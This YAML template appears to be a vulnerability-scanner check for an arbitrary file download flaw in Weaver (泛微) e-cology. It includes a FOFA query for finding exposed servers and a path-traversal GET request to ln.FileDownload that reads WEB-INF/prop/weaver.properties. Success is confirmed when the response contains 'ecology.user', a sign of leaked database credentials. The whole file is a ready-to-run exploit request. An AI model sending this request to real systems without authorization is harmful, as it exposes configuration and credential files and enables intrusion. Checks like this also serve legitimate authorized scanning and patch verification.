info:
  vulId: weaver_ecology_filedownload
  detail: 泛微ecology ln.FileDownload任意文件下载
  fofaQuery: app="泛微-E-Weaver"
rules:
  - request:
      payload:
        - ""
      path: "{{rootUrl}}/weaver/ln.FileDownload?fpath=..%2Fecology%2FWEB-INF%2Fprop%2Fweaver.properties"
      method: GET
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
      redirect: false
      dataType: text
      data: ""
    checksCondition: and
    checks:
      - checkType: string
        desireds:
          - ecology.user
        place: body
        condition: and

      - checkType: status
        desireds:
          - 200
        condition: and